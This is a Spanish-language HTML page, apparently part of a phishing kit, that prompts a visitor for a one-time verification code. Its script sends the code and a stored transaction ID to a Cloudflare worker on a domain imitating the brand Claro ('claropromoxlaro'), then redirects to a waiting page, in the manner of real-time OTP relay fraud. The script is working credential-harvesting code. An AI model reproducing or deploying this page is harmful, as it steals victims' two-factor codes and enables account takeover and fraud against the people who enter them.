<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ingresar código</title>
  <style>
    body {
      background: #0a0f2c;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: linear-gradient(180deg,#12203f,#0e1630);
      padding: 28px;
      border-radius: 12px;
      width: 360px;
      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
      text-align: center;
    }
    h2 { margin: 0 0 8px; color: #cfefff; }
    p { margin: 0 0 18px; color: #b7dff6; font-size: 0.95rem; }
    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      background: #091428;
      color: #fff;
      box-sizing: border-box;
      font-size: 1rem;
    }
    .actions {
      margin-top: 16px;
      display:flex;
      gap:10px;
    }
    button {
      flex:1;
      padding: 11px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      font-weight: 700;
    }
    .send { background: #4fc3f7; color: #041028; }
    .cancel { background: #263648; color: #cfefff; }
    .msg { margin-top:12px; font-size:0.95rem; color:#d0eefd; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Introduce el código</h2>
    <p>Escribe el código que recibiste y presiona Enviar.</p>

    <input id="otp" type="text" placeholder="Código (OTP)" inputmode="numeric" />

    <div class="actions">
      <button class="cancel" id="volver">Volver</button>
      <button class="send" id="enviar">Enviar</button>
    </div>

    <div class="msg" id="msg"></div>
  </div>

  <script>
    const WORKER_BASE = "https://blue-night-7897.claropromoxlaro.workers.dev"; // tu worker

    document.getElementById('volver').addEventListener('click', () => {
      window.location.href = 'cargando.html';
    });

    document.getElementById('enviar').addEventListener('click', async () => {
      const msgEl = document.getElementById('msg');
      const otp = document.getElementById('otp').value.trim();
      if (!otp) {
        msgEl.textContent = "Ingresa el código antes de enviar.";
        return;
      }

      const transactionId = localStorage.getItem('transactionId');
      if (!transactionId) {
        msgEl.textContent = "Error: falta transactionId. Vuelve a iniciar sesión.";
        setTimeout(() => window.location.href = 'login.html', 1500);
        return;
      }

      msgEl.textContent = "Enviando código...";
      try {
        const res = await fetch(`${WORKER_BASE}/otp-code`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ transactionId, otp })
        });

        if (!res.ok) {
          const err = await res.text();
          msgEl.textContent = "Error al enviar: " + (err || res.status);
          return;
        }

        const json = await res.json();
        if (json.ok) {
          msgEl.textContent = "Código enviado. Volviendo a espera...";
        } else {
          msgEl.textContent = "Respuesta inesperada: " + JSON.stringify(json);
        }

      } catch (e) {
        console.error("Error enviando código:", e);
        msgEl.textContent = "Error de conexión al enviar el código.";
      }

      // pequeña espera para que el usuario vea el mensaje y luego volver a cargando
      setTimeout(() => { window.location.href = 'cargando.html'; }, 900);
    });
  </script>
</body>
</html>
